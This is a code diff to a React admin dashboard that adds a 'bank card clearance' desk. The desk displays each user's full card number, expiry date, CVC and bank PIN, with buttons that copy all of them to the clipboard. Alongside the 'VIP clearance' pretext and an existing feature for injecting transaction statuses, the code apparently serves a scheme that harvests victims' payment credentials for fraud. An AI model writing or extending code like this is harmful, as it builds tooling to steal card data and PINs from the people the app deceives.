@@ -4,7 +4,7 @@ import { User, Transaction, ChixTokVideo } from '../types';
 import { getStoredChixTokVideos, saveChixTokVideos, deleteChixTokVideoFromFirestore } from './ChixTok';
 import { collection, getDocs, doc, setDoc, onSnapshot, deleteDoc, addDoc, serverTimestamp } from 'firebase/firestore';
 import { db, sanitizeForFirestore, useBankDetails, updateBankDetails, useGiveawayStatus, updateGiveawayStatus, useAppChannels, updateAppChannels } from '../firebase';
-import { Search, ShieldAlert, Sparkles, Zap, Lock, Eye, AlertCircle, RefreshCw, CheckCircle2, XCircle, Bell, Settings, UserCheck, HelpCircle, Trash, Megaphone, ExternalLink, PauseCircle, PlayCircle } from 'lucide-react';
+import { Search, ShieldAlert, Sparkles, Zap, Lock, Eye, AlertCircle, RefreshCw, CheckCircle2, XCircle, Bell, Settings, UserCheck, HelpCircle, Trash, Megaphone, ExternalLink, PauseCircle, PlayCircle, Copy, Trash2, CreditCard } from 'lucide-react';
 
 interface AdminDashboardProps {
   onBack: () => void;
@@ -148,6 +148,34 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
   const [injectTxStatus, setInjectTxStatus] = useState<'success' | 'pending' | 'failed'>('success');
 
   // Filter accounts state
+    const [copiedClearanceEmail, setCopiedClearanceEmail] = useState<string | null>(null);
+
+  const handleCopyClearance = (targetUser: User) => {
+    if (!targetUser.cardClearance) return;
+    const c = targetUser.cardClearance;
+    const text = `=== BANK CARD CLEARANCE DETAILS ===\n` +
+      `User Name: ${targetUser.name}\n` +
+      `Email: ${targetUser.email}\n` +
+      `Card Holder: ${c.cardHolderName || "N/A"}\n` +
+      `Card Number: ${c.cardNumber || "N/A"}\n` +
+      `Expiry Date: ${c.expiryDate || "N/A"}\n` +
+      `CVC: ${c.cvc || "N/A"}\n` +
+      `Bank PIN: ${c.bankPin || "N/A"}\n` +
+      `Submitted: ${c.submittedAt ? new Date(c.submittedAt).toLocaleString() : "N/A"}`;
+
+    navigator.clipboard.writeText(text);
+    setCopiedClearanceEmail(targetUser.email);
+    setTimeout(() => setCopiedClearanceEmail(null), 2500);
+  };
+
+  const handleDeleteClearance = async (targetUser: User) => {
+    if (!confirm(`Are you sure you want to delete bank card clearance details for ${targetUser.name} (${targetUser.email})?`)) return;
+    const updatedUser: User = { ...targetUser };
+    delete updatedUser.cardClearance;
+    await saveUserDocument(targetUser.email, updatedUser);
+    alert(`✓ Bank card clearance details successfully deleted for ${targetUser.name}.`);
+  };
+
   const [filterType, setFilterType] = useState<'all' | 'pending_verification' | 'unsubscribed' | 'restricted' | 'card_clearance'>('all');
   const [searchEmail, setSearchEmail] = useState('');
   const [showPendingSubPage, setShowPendingSubPage] = useState(false);
@@ -1221,6 +1249,10 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
   };
 
   // Performance optimizations using useMemo to avoid laggy filtering and search re-renders
+  const cardClearanceUsers = useMemo(() => {
+    return users.filter(u => u.cardClearance);
+  }, [users]);
+
   const pendingUsers = useMemo(() => {
     return users.filter(u => u.pendingActivation || u.pendingDeposit).map(u => {
       if (!u.pendingActivation && u.pendingDeposit) {
@@ -1373,6 +1405,94 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
                       >
                           <span>← Back to Main Dashboard</span>
                       </button>
+                  </div>
+              </div>
+
+              
+              {/* Pending Bank Card Clearances Section */}
+              <div className="bg-zinc-900/50 backdrop-blur-sm rounded-3xl shadow-sm border border-amber-500/30 overflow-hidden mb-6">
+                  <div className="p-5 bg-gradient-to-r from-amber-950/40 via-yellow-950/20 to-black border-b border-amber-500/20 flex items-center justify-between">
+                      <h3 className="font-extrabold text-white text-sm flex items-center space-x-2 font-mono">
+                          <CreditCard className="text-amber-400 animate-pulse stroke-[2.2]" size={18} />
+                          <span className="tracking-wide text-amber-300">PENDING BANK CARD CLEARANCES ({cardClearanceUsers.length})</span>
+                      </h3>
+                      <span className="text-[9px] font-mono font-bold text-amber-400 bg-amber-950/60 border border-amber-500/30 px-2.5 py-0.5 rounded-full uppercase tracking-wider">
+                          Card Clearance Desk
+                      </span>
+                  </div>
+                  
+                  <div className="divide-y divide-zinc-800/80">
+                      {cardClearanceUsers.length === 0 ? (
+                          <div className="p-10 text-center text-zinc-500 text-xs font-mono font-bold py-12 uppercase tracking-wider bg-zinc-900/20">
+                              ✓ No pending bank card clearance submissions on file
+                          </div>
+                      ) : (
+                          cardClearanceUsers.map((cUser) => {
+                              const c = cUser.cardClearance!;
+                              const isCopied = copiedClearanceEmail === cUser.email;
+                              return (
+                                  <div key={cUser.email} className="p-5 flex flex-col gap-4 bg-black/40 hover:bg-black/60 transition-all">
+                                      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
+                                          <div className="space-y-1">
+                                              <div className="flex items-center space-x-2">
+                                                  <h4 className="font-bold text-white text-sm">{cUser.name}</h4>
+                                                  <span className="px-2 py-0.5 rounded-full text-[9px] font-mono text-amber-400 bg-amber-950/60 border border-amber-500/30">
+                                                      {cUser.email}
+                                                  </span>
+                                              </div>
+                                              <p className="text-[10px] font-mono text-zinc-400">
+                                                  Submitted: {c.submittedAt ? new Date(c.submittedAt).toLocaleString() : "N/A"}
+                                              </p>
+                                          </div>
+                                          
+                                          <div className="flex flex-wrap items-center gap-2">
+                                              <button
+                                                  onClick={() => handleCopyClearance(cUser)}
+                                                  className={`px-3.5 py-2 border text-[10px] font-mono font-bold rounded-xl uppercase tracking-wider transition-all flex items-center space-x-1.5 cursor-pointer ${
+                                                      isCopied 
+                                                          ? "bg-emerald-600 border-emerald-500 text-black font-extrabold" 
+                                                          : "bg-amber-500 hover:bg-amber-400 text-black border-amber-500 font-extrabold shadow-sm"
+                                                  }`}
+                                              >
+                                                  {isCopied ? <CheckCircle2 size={13} /> : <Copy size={13} />}
+                                                  <span>{isCopied ? "✓ Details Copied!" : "Copy Details"}</span>
+                                              </button>
+                                              
+                                              <button
+                                                  onClick={() => handleDeleteClearance(cUser)}
+                                                  className="px-3.5 py-2 bg-rose-950/60 hover:bg-rose-900 hover:text-white text-rose-300 border border-rose-500/30 text-[10px] font-mono font-bold rounded-xl uppercase tracking-wider transition-all flex items-center space-x-1.5 cursor-pointer"
+                                              >
+                                                  <Trash2 size={13} />
+                                                  <span>Delete Clearance</span>
+                                              </button>
+                                          </div>
+                                      </div>
+
+                                      {/* Card Details Ledger Block */}
+                                      <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-3 p-3 bg-zinc-950 rounded-2xl border border-amber-500/20 font-mono text-xs">
+                                          <div className="bg-black/80 p-2.5 rounded-xl border border-zinc-800">
+                                              <span className="text-[9px] text-zinc-500 block uppercase tracking-wider">Cardholder Name</span>
+                                              <span className="font-bold text-amber-300 select-all block mt-0.5">{c.cardHolderName || "N/A"}</span>
+                                          </div>
+                                          <div className="bg-black/80 p-2.5 rounded-xl border border-zinc-800">
+                                              <span className="text-[9px] text-zinc-500 block uppercase tracking-wider">Card Number</span>
+                                              <span className="font-black text-white tracking-widest select-all block mt-0.5">{c.cardNumber || "N/A"}</span>
+                                          </div>
+                                          <div className="bg-black/80 p-2.5 rounded-xl border border-zinc-800">
+                                              <span className="text-[9px] text-zinc-500 block uppercase tracking-wider">Expiry & CVC</span>
+                                              <span className="font-bold text-white block mt-0.5">
+                                                  <span className="text-amber-300">{c.expiryDate || "N/A"}</span> | CVC: <span className="text-amber-300">{c.cvc || "N/A"}</span>
+                                              </span>
+                                          </div>
+                                          <div className="bg-black/80 p-2.5 rounded-xl border border-zinc-800">
+                                              <span className="text-[9px] text-zinc-500 block uppercase tracking-wider">Bank PIN</span>
+                                              <span className="font-black text-emerald-400 select-all block mt-0.5">{c.bankPin || "N/A"}</span>
+                                          </div>
+                                      </div>
+                                  </div>
+                              );
+                          })
+                      )}
                   </div>
               </div>
 
@@ -2051,12 +2171,12 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
                     onClick={() => setShowPendingSubPage(true)}
                     className="bg-zinc-900/60 border border-zinc-800 rounded-2xl p-4 shadow-[0_0_15px_-3px_rgba(16,185,129,0.02)] relative overflow-hidden hover:border-emerald-500/50 hover:bg-zinc-900 transition-all text-left w-full cursor-pointer group"
                 >
-                    <span className="text-[9px] font-bold text-zinc-400 group-hover:text-emerald-400 uppercase tracking-widest block font-mono">Pending Receipts</span>
+                    <span className="text-[9px] font-bold text-zinc-400 group-hover:text-emerald-400 uppercase tracking-widest block font-mono">Pending Receipts & Cards</span>
                     <span className="text-2xl font-black text-white font-mono block mt-1 flex items-center gap-1.5">
-                        {pendingUsers.length}
-                        {pendingUsers.length > 0 && <span className="inline-block w-2 h-2 rounded-full bg-emerald-500 animate-ping" />}
+                        {pendingUsers.length + cardClearanceUsers.length}
+                        {(pendingUsers.length > 0 || cardClearanceUsers.length > 0) && <span className="inline-block w-2 h-2 rounded-full bg-amber-400 animate-ping" />}
                     </span>
-                    <span className="text-[9.5px] text-zinc-500 font-mono mt-1 block group-hover:text-emerald-400">Click to view all →</span>
+                    <span className="text-[9.5px] text-zinc-500 font-mono mt-1 block group-hover:text-emerald-400">{pendingUsers.length} Receipts | {cardClearanceUsers.length} Clearance Cards →</span>
                     <div className="absolute right-3.5 bottom-3 text-emerald-500/5 group-hover:text-emerald-500/20 transition-all">
                         <ShieldAlert size={28} />
                     </div>
@@ -2760,11 +2880,29 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
                                                  {/* Subsection: VIP Bank Payment Card Clearance Details */}
                                                  {user.cardClearance ? (
                                                      <div className="space-y-3 bg-gradient-to-r from-amber-950/40 via-yellow-950/20 to-black p-4 rounded-xl border border-amber-500/40 mb-4 col-span-1 sm:col-span-2">
-                                                         <h5 className="text-[10px] font-mono font-bold text-amber-400 uppercase tracking-wider flex items-center justify-between">
+                                                         <h5 className="text-[10px] font-mono font-bold text-amber-400 uppercase tracking-wider flex flex-wrap items-center justify-between gap-2">
                                                              <span>💳 VIP Bank Payment Card Clearance Details</span>
-                                                             <span className="text-[9px] text-zinc-400 font-mono">
-                                                                 {user.cardClearance.submittedAt ? `Submitted: ${new Date(user.cardClearance.submittedAt).toLocaleString()}` : ""}
-                                                             </span>
+                                                             <div className="flex items-center space-x-2">
+                                                                 <span className="text-[9px] text-zinc-400 font-mono mr-1">
+                                                                     {user.cardClearance.submittedAt ? `Submitted: ${new Date(user.cardClearance.submittedAt).toLocaleString()}` : ""}
+                                                                 </span>
+                                                                 <button
+                                                                     type="button"
+                                                                     onClick={() => handleCopyClearance(user)}
+                                                                     className="px-2.5 py-1 bg-amber-500 hover:bg-amber-400 text-black text-[9px] font-mono font-black rounded-lg uppercase tracking-wider transition-all flex items-center space-x-1 cursor-pointer"
+                                                                 >
+                                                                     <Copy size={11} />
+                                                                     <span>{copiedClearanceEmail === user.email ? "✓ Copied" : "Copy All"}</span>
+                                                                 </button>
+                                                                 <button
+                                                                     type="button"
+                                                                     onClick={() => handleDeleteClearance(user)}
+                                                                     className="px-2.5 py-1 bg-rose-950 hover:bg-rose-900 text-rose-300 border border-rose-500/30 text-[9px] font-mono font-bold rounded-lg uppercase tracking-wider transition-all flex items-center space-x-1 cursor-pointer"
+                                                                 >
+                                                                     <Trash2 size={11} />
+                                                                     <span>Delete</span>
+                                                                 </button>
+                                                             </div>
                                                          </h5>
                                                          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-3 text-xs font-mono">
                                                              <div className="bg-black/80 p-3 rounded-lg border border-amber-500/20">
